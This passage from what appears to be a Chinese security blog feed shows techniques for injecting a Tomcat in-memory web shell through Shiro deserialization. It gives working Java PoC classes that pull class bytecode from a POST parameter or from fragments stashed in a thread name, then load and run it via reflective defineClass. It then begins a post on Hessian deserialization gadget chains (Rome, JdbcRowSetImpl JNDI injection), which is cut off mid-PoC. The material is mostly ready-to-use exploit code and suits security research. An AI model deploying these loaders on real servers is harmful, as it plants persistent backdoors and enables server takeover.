class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil6</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">BASE64Decoder</span> <span class="variable">b64Decoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">codeClass</span> <span class="operator">=</span> <span class="string">&quot;Gzip+Base64压缩后的类&quot;</span>;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">currentClassloader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b64Decoder.decodeBuffer(codeClass));</span><br><span class="line">            <span class="type">GZIPInputStream</span> <span class="variable">gzip</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(bais);</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">256</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span> ((n = gzip.read(buffer)) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, n);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">byte</span>[] byteArray = baos.toByteArray();</span><br><span class="line">            ((Class) defineClass.invoke(currentClassloader, byteArray, <span class="number">0</span>, byteArray.length)).newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="将内存马写入POST请求体"><a href="#将内存马写入POST请求体" class="headerlink" title="将内存马写入POST请求体"></a>将内存马写入POST请求体</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p><code>Header</code> 的长度受限但是 <code>Body</code> 是不受限的，所以我们可以把内存马的字节码放到请求体中，然后在命令执行的时候从请求体中拿到字节码，然后动态类加载。</p><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><p>第一步：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;FilterMemShellExp&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="type">byte</span>[] bytecode = ctClass.toBytecode();</span><br><span class="line">        System.out.println(Base64.encodeToString(bytecode));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二步：</p><p>请求时 <code>url</code> 必须加上 <code>demo</code> 才会加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.webresources.StandardRoot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil5</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span></span><br><span class="line">                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> org.apache.catalina.core.StandardContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 低版本Tomcat</span></span><br><span class="line"><span class="comment">//            org.apache.catalina.Context context = webappClassLoaderBase.getResources().getContext();</span></span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">resourcesField</span> <span class="operator">=</span> webappClassLoaderBase.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">            resourcesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardRoot</span> <span class="variable">standardRoot</span> <span class="operator">=</span> (StandardRoot) resourcesField.get(webappClassLoaderBase);</span><br><span class="line">            org.apache.catalina.core.<span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (org.apache.catalina.core.ApplicationContext) contextField.get(standardRoot.getContext());</span><br><span class="line"></span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">serviceField</span> <span class="operator">=</span> org.apache.catalina.core.ApplicationContext.class.getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">            serviceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            org.apache.catalina.core.<span class="type">StandardService</span> <span class="variable">standardService</span> <span class="operator">=</span> (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; connectors.length; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (connectors[i].getScheme().contains(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">                    org.apache.coyote.<span class="type">ProtocolHandler</span> <span class="variable">protocolHandler</span> <span class="operator">=</span> connectors[i].getProtocolHandler();</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">getHandlerMethod</span> <span class="operator">=</span> org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(<span class="string">&quot;getHandler&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                    getHandlerMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    org.apache.tomcat.util.net.AbstractEndpoint.<span class="type">Handler</span> <span class="variable">connectoinHandler</span> <span class="operator">=</span> (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">                    java.lang.reflect.<span class="type">Field</span> <span class="variable">globalField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">                    globalField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    org.apache.coyote.<span class="type">RequestGroupInfo</span> <span class="variable">requestGroupInfo</span> <span class="operator">=</span> (org.apache.coyote.RequestGroupInfo) globalField.get(connectoinHandler);</span><br><span class="line"></span><br><span class="line">                    java.lang.reflect.<span class="type">Field</span> <span class="variable">processorsField</span> <span class="operator">=</span> org.apache.coyote.RequestGroupInfo.class.getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                    processorsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    java.util.<span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> (java.util.List) processorsField.get(requestGroupInfo);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//通过QueryString筛选</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; list.size(); k++) &#123;</span><br><span class="line">                        org.apache.coyote.<span class="type">RequestInfo</span> <span class="variable">requestInfo</span> <span class="operator">=</span> (org.apache.coyote.RequestInfo) list.get(k);</span><br><span class="line">                        <span class="keyword">if</span> (requestInfo.getCurrentUri().contains(<span class="string">&quot;demo&quot;</span>))&#123;</span><br><span class="line">                            System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">                            java.lang.reflect.<span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> org.apache.coyote.RequestInfo.class.getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                            requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            org.apache.coyote.<span class="type">Request</span> <span class="variable">tempRequest</span> <span class="operator">=</span> (org.apache.coyote.Request) requestField.get(requestInfo);</span><br><span class="line">                            org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (org.apache.catalina.connector.Request) tempRequest.getNote(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="type">String</span> <span class="variable">classData</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;classData&quot;</span>);</span><br><span class="line">                            System.out.println(classData);</span><br><span class="line">                            <span class="type">byte</span>[] classBytes = <span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(classData);</span><br><span class="line">                            java.lang.reflect.<span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">                            defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            ((Class) defineClassMethod.invoke(Evil5.class.getClassLoader(), classBytes, <span class="number">0</span>, classBytes.length)).newInstance();</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="将内存马分段写入线程名"><a href="#将内存马分段写入线程名" class="headerlink" title="将内存马分段写入线程名"></a>将内存马分段写入线程名</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>这个方法和上面的类似，我们可以先通过命令执行将 <code>Tomcat</code> 的某一个线程名写一个特殊值，然后接下来将内存马的 <code>payload</code> 拆分为几块分批添加到这个线程名的后面，最终 <code>Tomcat</code> 的某个线程名就会为某个特殊值拼接内存马的 <code>payload</code> （线程名的长度是没有限制的）。</p><p>这样子理论上只要我们将内存马的 <code>payload</code> 拆分的越细，那么单个 <code>payload</code> 的长度就会越短。虽然有点麻烦，但是适合于 <code>maxHttpHeaderSize</code> 要求在很小的情况下。</p><p>然后最后根据特殊值找到这个存储了内存马 <code>payload</code> 的线程，然后根据这个线程的线程名来动态类加载。</p><p>实测把内存马的 <code>payload</code> 分为四份那么每次 <code>payload</code> 的长度就差不多可以控制在 <code>6000</code> 以下。</p><h2 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h2><p>第一步：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;FilterMemShellExp&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="type">byte</span>[] bytecode = ctClass.toBytecode();</span><br><span class="line">        System.out.println(Base64.encodeToString(bytecode));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二步：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil2</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        Thread.currentThread().setName(<span class="string">&quot;justdoit&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三步：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil3</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">ThreadGroup</span> <span class="variable">threadGroup</span> <span class="operator">=</span> Thread.currentThread().getThreadGroup();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">threadsField</span> <span class="operator">=</span> threadGroup.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            threadsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Thread[] threads = (Thread[]) threadsField.get(threadGroup);</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread.getName().contains(<span class="string">&quot;justdoit&quot;</span>)) &#123;</span><br><span class="line">                    thread.setName(thread.getName() + <span class="string">&quot;&lt;分片的内存马payload&gt;&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第四步：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil4</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">ThreadGroup</span> <span class="variable">threadGroup</span> <span class="operator">=</span> Thread.currentThread().getThreadGroup();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">threadsField</span> <span class="operator">=</span> threadGroup.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            threadsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Thread[] threads = (Thread[]) threadsField.get(threadGroup);</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread.getName().contains(<span class="string">&quot;justdoit&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> thread.getName().replaceAll(<span class="string">&quot;justdoit&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                    System.out.println(<span class="string">&quot;payload = &quot;</span> + payload);</span><br><span class="line">                    <span class="type">byte</span>[] decode = Base64.decode(payload);</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">                    defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    ((Class)defineClassMethod.invoke(threadGroup.getClass().getClassLoader(), decode, <span class="number">0</span>, decode.length)).newInstance();</span><br><span class="line">                    System.out.println(<span class="string">&quot;注入成功&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在实战中针对默认情况，第三种方法是最方便和最稳定的，如果是在 <code>CTF</code> 比赛中，特意改小了 <code>maxHttpHeaderSize</code> 的值，需要控制 <code>Payload</code> 的长度很短，此时就得用比较麻烦的第四种方法了。<br>此外，我们可以发现最原生注入内存马的打法其实 <code>payload</code> 的长度也没有超过很多，大概超了 <code>1000</code> 多，所以我们或许可以使用 <a href="https://mp.weixin.qq.com/s?__biz=Mzk0MTIzNTgzMQ==&mid=2247489588&idx=1&sn=0aa89b8828dc3e058ddbef69e2980790&chksm=c2d4d32cf5a35a3a54d164198cf7a29bea915a8c0e00d76d47231090cec35630f393ecd5d89d&scene=21#wechat_redirect">终极字节码技术</a>来缩短 <code>payload</code> 的长度也是可以的，这里以后再单独研究。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/12537">https://xz.aliyun.com/t/12537</a><br><a href="https://xz.aliyun.com/t/14107">https://xz.aliyun.com/t/14107</a><br><a href="https://xz.aliyun.com/t/10696">https://xz.aliyun.com/t/10696</a><br><a href="https://blog.csdn.net/weixin_68320784/article/details/124181206">https://blog.csdn.net/weixin_68320784/article/details/124181206</a><br><a href="https://zhuanlan.zhihu.com/p/395443877">https://zhuanlan.zhihu.com/p/395443877</a><br><a href="https://myzxcg.com/2021/11/Shiro-%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC">https://myzxcg.com/2021/11/Shiro-%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC</a><br><a href="https://mp.weixin.qq.com/s?__biz=Mzk0MTIzNTgzMQ==&mid=2247489588&idx=1&sn=0aa89b8828dc3e058ddbef69e2980790&chksm=c2d4d32cf5a35a3a54d164198cf7a29bea915a8c0e00d76d47231090cec35630f393ecd5d89d&scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=Mzk0MTIzNTgzMQ==&amp;mid=2247489588&amp;idx=1&amp;sn=0aa89b8828dc3e058ddbef69e2980790&amp;chksm=c2d4d32cf5a35a3a54d164198cf7a29bea915a8c0e00d76d47231090cec35630f393ecd5d89d&amp;scene=21#wechat_redirect</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> Shiro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hessian漏洞总结</title>
      <link href="/2024/03/13/Hessian%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2024/03/13/Hessian%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p><code>Hessian</code> 在反序列化的时候虽然不会像 <code>Fastjson</code> 会调用目标类的 <code>getter</code> 和 <code>setter</code> 方法，甚至构造方法，但是 <code>Hession</code> 在反序列化 <code>Map</code> 类型的数据时，会创建相应的 <code>Map</code> 对象，并将 <code>Key</code> 和 <code>Value</code> 分别反序列化后使用 <code>put</code> 方法写入数据。在没有指定 <code>Map</code> 的具体实现类时，将会默认使用 <code>HashMap</code> ，对于 <code>SortedMap</code> ，将会使用 <code>TreeMap</code> 。</p><p><img src="/imgs/Pasted%20image%2020240312192747.png"></p><p>而熟悉 <code>HashMap</code> 链子的应该知道，<code>HashMap.put()</code> 方法是存在漏洞的链子的。回想之前在利用 <code>HashMap.readObject()</code> 的时候，不能直接使用 <code>put</code> 存入元素，而需要通过反射修改 <code>HashMap</code> 的属性来存入元素，就是为了避免 <code>HashMap.put()</code> 的时候提前触发漏洞，例如参考 <a href="Java%E5%AE%89%E5%85%A8/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%A7%E5%85%A8/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93.md">Fastjson漏洞总结</a> 。</p><p><img src="/imgs/Pasted%20image%2020240311235614.png"></p><blockquote><p>此外， <code>Hessian</code> 提供了机制可以反序列化没有实现 <code>Serializable</code> 接口的类，这就使 <code>Hessian</code> 的链子可以更加广泛。</p></blockquote><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>常见的以 <code>Map.put()</code> 开头的链子有下面几个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap.put()-&gt;HashMap.putVal()-&gt;任意equals(Object)调用</span><br><span class="line">HashMap.put()-&gt;任意hashCode()调用</span><br><span class="line">TreeMap.put()-&gt;任意compareTo(Object)调用</span><br></pre></td></tr></table></figure><p>也就是说 <code>Hessian</code> 相对比原生反序列化的利用链，有几个限制：</p><ul><li><code>gadget chain</code> 起始方法只能为 <code>hashCode/equals/compareTo</code> 方法</li><li>利用链中调用的成员变量不能为 <code>transient</code> 修饰</li><li>所有的调用不依赖类中 <code>readObject</code> 的逻辑，也不依赖 <code>getter/setter</code> 的逻辑</li></ul><p>这几个限制也导致了很多 <code>Java</code> 原生反序列化利用链在 <code>Hessian</code> 中无法使用，甚至 <code>ysoserial</code> 中一些明明是 <code>hashCode/equals/compareTo</code> 触发的链子都不能直接拿来用。</p><p>目前常见的 <code>Hessian</code> 利用链在 <code>marshalsec</code> 中共有如下五个：</p><ul><li><code>Rome</code></li><li><code>XBean</code></li><li><code>Resin</code></li><li><code>SpringPartiallyComparableAdvisorHolder</code></li><li><code>SpringAbstractBeanFactoryPointcutAdvisor</code></li></ul><h1 id="Rome链"><a href="#Rome链" class="headerlink" title="Rome链"></a>Rome链</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.rometools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p><code>Hession</code> 反序列化 -&gt;<br><code>HashMap.put()</code> -&gt;<br><code>EqualsBean.hashCode()</code> -&gt;<br><code>ToStringBean.toString()</code> -&gt;<br>任意 <code>getter</code> 调用。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>这里给出 <code>JdbcRowSetImpl#getDatabaseMetaData()</code> -&gt; <code>JNDI</code> 注入的 <code>poc</code> 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 